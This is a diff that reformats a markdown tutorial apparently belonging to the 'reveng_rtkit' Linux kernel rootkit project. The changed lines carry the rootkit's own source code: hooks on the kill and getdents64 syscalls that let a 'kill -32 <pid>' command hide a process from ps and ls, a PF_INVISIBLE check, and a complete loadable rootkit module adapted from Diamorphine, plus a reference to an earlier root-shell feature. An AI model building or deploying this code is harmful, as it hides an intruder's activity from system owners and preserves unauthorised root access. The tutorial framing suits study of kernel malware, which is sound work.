@@ -1288,19 +1288,19 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
    We can see 3 things:\
               1. In ***fish shell***, this mechanism of getting root shell is not working, I don't really know why... (<ins>If any viewers seeing this, have any solution to this problem, please don't hesitate to do a PR to my repo but before that please visit, [idea](https://github.com/reveng007/reveng_rtkit#note-1)</ins>).\
               2. In ***bash shell***, it is working as expected.\
-              3. In ***sh shell***, it is working as expected too.
+              3. In ***sh shell***, it is working as expected too.\
 
-      2. **getdents64** syscall: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L487)\
+    2. **getdents64** syscall: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L487)\
 
-          I actually wanted to hide ongoing processes and I got that idea for hiding processes from [source1: R3x/linux-rootkits](https://github.com/R3x/linux-rootkits#features-descriptions), but I was unable to understand that portion of code which was linked. I then searched through other [resource links](https://github.com/reveng007/reveng_rtkit#resources-that-helped-me) that I had. I found out this: [source2](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.). I will be implementing this mechanism via **kill syscall** (or sys_kill) as I did earlier.
+   I actually wanted to hide ongoing processes and I got that idea for hiding processes from [source1: R3x/linux-rootkits](https://github.com/R3x/linux-rootkits#features-descriptions), but I was unable to understand that portion of code which was linked. I then searched through other [resource links](https://github.com/reveng007/reveng_rtkit#resources-that-helped-me) that I had. I found out this: [source2](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.). I will be implementing this mechanism via **kill syscall** (or sys_kill) as I did earlier.
           
-          But here, we are actually intercepting two syscalls simultaneously,\
-          1. ***kill syscall***: To hide pid of any process, cmd: _`kill -32 <pid>`_.\
-          2. ***getdents64 syscall***: Please go through this [link](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.) (it is the same previous link) and check the last 2 paragraphs of it. It will say that, `ps` command only just does an 'ls' on "`/proc/`" directory.\
+    But here, we are actually intercepting two syscalls simultaneously,\
+    1. ***kill syscall***: To hide pid of any process, cmd: _`kill -32 <pid>`_.\
+    2. ***getdents64 syscall***: Please go through this [link](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.) (it is the same previous link) and check the last 2 paragraphs of it. It will say that, `ps` command only just does an 'ls' on "`/proc/`" directory.\
 
-          Now then, what is the working machanism of `ls`?\
-          Visit: [gist-amitsaha](https://gist.github.com/amitsaha/8169242#how-does-ls-do-what-it-does). It says that, after the execution of `ls`, it in turn invokes the `getdents()` system call, which is responsible to read the directory contents.\
-          Let's check it.
+   Now then, what is the working machanism of `ls`?\
+   Visit: [gist-amitsaha](https://gist.github.com/amitsaha/8169242#how-does-ls-do-what-it-does). It says that, after the execution of `ls`, it in turn invokes the `getdents()` system call, which is responsible to read the directory contents.\
+   Let's check it.
               ```diff
               $ strace ls 1>/dev/null 2>/tmp/ls.strace; cat /tmp/ls.strace | cut -d'(' -f1 | sort -u
 
@@ -1328,7 +1328,7 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
               statfs
               write
               ```
-              In that sense, if I perform the same thing with `ps`, we should be also getting the same `getdents()` system call.
+     In that sense, if I perform the same thing with `ps`, we should be also getting the same `getdents()` system call.
               ```diff
               $ strace ps 1>/dev/null 2>/tmp/ps.strace; cat /tmp/ps.strace | cut -d'(' -f1 | sort -u
 
@@ -1370,17 +1370,16 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
                 3. rsi: which contains the passed arguments.
                 4. rdx: length of the passed argument(or string).
                 ```
-              In this scenario, we will only need **rdi** and **rsi** register. This is because, we need to know the passed argument (**rsi** register, rather **si** register) and as we will be dealing with files, we will ofcourse be needing the file descriptors (**rdi** register, rather **di** register). (Reason was mentioned [here](http://--link---#### Now the question comes, "Why _`si`_ register, why not _`rsi`_ register?"))
+      In this scenario, we will only need **rdi** and **rsi** register. This is because, we need to know the passed argument (**rsi** register, rather **si** register) and as we will be dealing with files, we will ofcourse be needing the file descriptors (**rdi** register, rather **di** register). (Reason was mentioned [here](http://--link---#### Now the question comes, "Why _`si`_ register, why not _`rsi`_ register?"))
 
-              So, a recap about the Workflow of the machanism:\
+       So, a recap about the Workflow of the machanism:\
                 - When we deliver pid of any process via `kill -32 <pid>`, it will at first find out that particular `pid` by surfing through "`/proc/`" directory.\
                 - After getting the `pid`, it will perform syscall hooking to hide that particular pid and then offering a new process list (excluding the mentioned pid), if the user tries to see running processes using ***ps***.
 
-                1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L99).\
-                Finding the process id/ pid:\
-                    According to [LKM_HACKING](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.):
-                    
-                    ```c
+        1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L99).\
+           Finding the process id/ pid:\
+           According to [LKM_HACKING](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.):
+```c
                     /* Here, -"&gt;" is the html character entities, which really mean: -">" 
                        I really don't know, how it happened in that site */
 
@@ -1396,9 +1395,9 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
                       while (p != current);
                       return NULL;
                     }
-                    ```
-                    I wasn't understanding this portion, but yes I was getting an idea that it is looping to get the process ids. So, I tried for loop.
-                    ```c
+```
+        I wasn't understanding this portion, but yes I was getting an idea that it is looping to get the process ids. So, I tried for loop.
+```c
                     // reveng_rtkit
 
                     #include <linux/sched.h>        /* task_struct: Core info about all the tasks */
@@ -1421,12 +1420,12 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
                       }
                     return NULL;
                     }
-                    ```
-                    This is basically a for loop macro. I got this expression from  [diamorphine](https://github.com/m0nad/Diamorphine/) project. Then searched it in [bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601).
+```
+   This is basically a for loop macro. I got this expression from  [diamorphine](https://github.com/m0nad/Diamorphine/) project. Then searched it in [bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601).
                     
-                2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L118).
-                We will now make a function to hide those directories responsible for corresponding `pid`. Got this portion from [heroin](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#A-b) and [diamorphine](https://github.com/m0nad/Diamorphine/) project.
-                   ```c
+    2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L118).\
+   We will now make a function to hide those directories responsible for corresponding `pid`. Got this portion from [heroin](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#A-b) and [diamorphine](https://github.com/m0nad/Diamorphine/) project.
+```c
                    /* Here, -"&gt;" : -">" and "&amp;" : "&" */
 
                    #define PF_INVISIBLE 0x10000000
@@ -1443,9 +1442,9 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
 
                       return(0);
                    }
-                   ```
-                   I made some changes,
-                   ```c
+```
+    I made some changes,
+```c
                    #define PF_INVISIBLE 0x10000000
 
                    static int is_invisible(pid_t pid)
@@ -1467,14 +1466,14 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
                       }
                       return 0;
                     }
-                   ```
-                   Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/4eb75d38eee64a1d804e49220c9cbff092671faf/kernel_src/include/hook_syscall_helper.h#L137)
-                   Now, comes the last and final part: ***getdents64*** syscall interception.
+```
+   Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/4eb75d38eee64a1d804e49220c9cbff092671faf/kernel_src/include/hook_syscall_helper.h#L137)\
+    Now, comes the last and final part: ***getdents64*** syscall interception.
 
-                   This portion is totally taken from [diamorphine](https://github.com/m0nad/Diamorphine/)
+   This portion is totally taken from [diamorphine](https://github.com/m0nad/Diamorphine/)
                    
-                   1. This is the whole rootkit.c file.
-                   ```c
+    1. This is the whole rootkit.c file.
+```c
                    // Test_rtkit.c
 
                    #include <linux/init.h>		/* Needed for the macros */
@@ -1562,11 +1561,11 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
                     MODULE_AUTHOR("reveng007");
                     MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
                     MODULE_VERSION("1.0");
-                   ```
-                   This code is same as before (the kill syscall portion), just `__NR_getdents64` is added (new), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L447).
+```
+   This code is same as before (the kill syscall portion), just `__NR_getdents64` is added (new), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L447). 
 
-                   Let us go step by step from `Test_hook_getdents64.h` file:
-                   ```c
+   Let us go step by step from `Test_hook_getdents64.h` file:
+```c
                    // Test_hook_getdents64.h
 
                    #include <linux/slab.h>         /* kmalloc(), kfree(), kzalloc() */
@@ -1603,13 +1602,13 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
 
 	                    int ret = orig_getdents64(pt_regs), err;
                         ...
-                   ```
-                   linux/slab.h: Will be used to allocate memories in ram for directory entries.
-                   linux/fdtable.h: For accessing file table structure.
-                   linux/proc_ns.h: For using `PROC_ROOT_INO`. I will explain it, when the time comes.
+```
+    linux/slab.h: Will be used to allocate memories in ram for directory entries.
+    linux/fdtable.h: For accessing file table structure.
+    linux/proc_ns.h: For using `PROC_ROOT_INO`. I will explain it, when the time comes.
 
-                   Now to the next part:
-                   ```c
+    Now to the next part:
+```c
                     ...
                    // kernel space related variables
                    unsigned short proc = 0;
@@ -1658,17 +1657,16 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
                    out:
                       kfree(kdirent);
                       return ret;
-                   ```
+```
+    Those kernel space and user space variables will mostly be used in `copy_from_user` and `copy_to_user` functions as we are going to pass arguments from _user space variable_ to _kernel space variable_ and vice-versa. Being in user space we can't read kernel space pointers/variables and vice-versa, that's the reason why `copy_from_user` and `copy_to_user` functions will be used.\
+     In this scenario, `copy_from_user` is used to pass the name of the passed _directory name_ to kernel mode variable, _kdirent_ and then we will hide whatever we want to hide and lastly, we will send the output using `copy_to_user` to the user space variable, _dirent_.
 
-                   Those kernel space and user space variables will mostly be used in `copy_from_user` and `copy_to_user` functions as we are going to pass arguments from _user space variable_ to _kernel space variable_ and vice-versa. Being in user space we can't read kernel space pointers/variables and vice-versa, that's the reason why `copy_from_user` and `copy_to_user` functions will be used.
-                   In this scenario, `copy_from_user` is used to pass the name of the passed _directory name_ to kernel mode variable, _kdirent_ and then we will hide whatever we want to hide and lastly, we will send the output using `copy_to_user` to the user space variable, _dirent_.
+     For the case of ***kzalloc***, `GFP_KERNEL` is _GFP flag_ which is used for kernel-internal allocations, [source: elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/gfp.h#L245).
 
-                   For the case of ***kzalloc***, `GFP_KERNEL` is _GFP flag_ which is used for kernel-internal allocations, [source: elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/gfp.h#L245).
+     The last thing, which need explanation is the <ins>error part</ins>. If some error occurs, like sending <ins>wrong</ins> `pid` number to kernel space, we will free the allocated memory pointed by the kdirent pointer and would return the error which actually occured.
 
-                   The last thing, which need explanation is the <ins>error part</ins>. If some error occurs, like sending <ins>wrong</ins> `pid` number to kernel space, we will free the allocated memory pointed by the kdirent pointer and would return the error which actually occured.
-
-                   Next part:
-                   ```c
+     Next part:
+```c
                    // Storing the inode value of the required directory(or pid) 
                    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 
@@ -1676,9 +1674,9 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
                             /*&& MINOR(d_inode->i_rdev) == 1*/)
                             proc = 1;
                     ...
-                   ```
-                   I paraphrased from [jm33.me](https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html):
-                   This piece of code checks if current `fd` points to proc fs, if yes, we say we are `ls`ing a `/proc` dir. `i_ino` is a inode number, representing its index number in linux vfs (virtual filesystem), `PROC_ROOT_INO` is defined as 1: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/proc_ns.h#L42).
+```
+     I paraphrased from [jm33.me](https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html):\
+     This piece of code checks if current `fd` points to proc fs, if yes, we say we are `ls`ing a `/proc` dir. `i_ino` is a inode number, representing its index number in linux vfs (virtual filesystem), `PROC_ROOT_INO` is defined as 1: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/proc_ns.h#L42).
                    ```c
                    /*
                     * We always define these enumerators
